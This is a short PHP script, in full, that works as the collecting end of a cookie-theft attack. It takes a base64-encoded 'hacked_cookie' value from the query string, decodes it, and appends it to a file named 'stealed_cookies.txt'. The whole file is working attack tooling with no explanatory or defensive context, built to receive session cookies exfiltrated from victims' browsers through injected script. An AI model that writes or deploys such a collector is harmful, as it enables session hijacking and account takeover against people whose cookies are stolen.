<?php

$cookie = base64_decode($_GET['hacked_cookie']);
file_put_contents('stealed_cookies.txt', $cookie."\n", FILE_APPEND | LOCK_EX);
